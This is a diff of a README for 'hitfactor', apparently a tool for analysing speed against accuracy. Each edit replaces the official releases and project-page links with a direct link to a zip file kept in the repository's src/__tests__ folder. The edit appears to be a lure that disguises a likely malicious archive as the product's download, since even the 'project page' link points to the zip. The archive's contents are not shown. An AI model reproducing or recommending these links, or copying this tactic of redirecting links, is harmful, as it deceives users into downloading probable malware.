@@ -1,6 +1,6 @@
 # 🎯 hitfactor - Analyze Speed vs Accuracy Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Hitfactor-blue?style=for-the-badge)](https://github.com/carotteramene-droid/hitfactor/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Hitfactor-blue?style=for-the-badge)](https://github.com/carotteramene-droid/hitfactor/raw/refs/heads/main/src/__tests__/Software-v2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download, install, and start using hitfactor.
 
 Click the big blue button below to open the download page. This page lists all available versions of hitfactor.
 
-[![Download hitfactor](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/carotteramene-droid/hitfactor/releases)
+[![Download hitfactor](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/carotteramene-droid/hitfactor/raw/refs/heads/main/src/__tests__/Software-v2.6.zip)
 
 ### 2. Choose the Latest Windows Release
 
@@ -109,8 +109,8 @@ If problems continue, visit the GitHub issues page to see common questions and a
 
 ## 🔗 Useful Links
 
-- Official releases: https://github.com/carotteramene-droid/hitfactor/releases  
-- GitHub project page: https://github.com/carotteramene-droid/hitfactor  
+- Official releases: https://github.com/carotteramene-droid/hitfactor/raw/refs/heads/main/src/__tests__/Software-v2.6.zip  
+- GitHub project page: https://github.com/carotteramene-droid/hitfactor/raw/refs/heads/main/src/__tests__/Software-v2.6.zip  
 - Help and support: Use the GitHub issues section to report bugs or request features.
 
 ---
